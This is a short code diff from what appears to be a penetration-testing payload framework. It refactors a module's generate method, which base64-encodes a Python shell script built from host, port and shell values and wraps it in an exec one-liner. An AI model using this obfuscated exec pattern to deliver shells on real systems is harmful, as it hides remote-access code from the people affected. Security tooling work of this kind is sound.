@@ -63,6 +63,4 @@ class Module(Payload):
         return self._build_script(host, port, shell)
 
     def generate(self):
-        script = self.get_python_script()
-        encoded = base64.b64encode(script.encode('utf-8')).decode('ascii')
-        return f'{self.python_binary} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
+        return self._encode_python_one_liner(self.get_python_script(), self.python_binary)
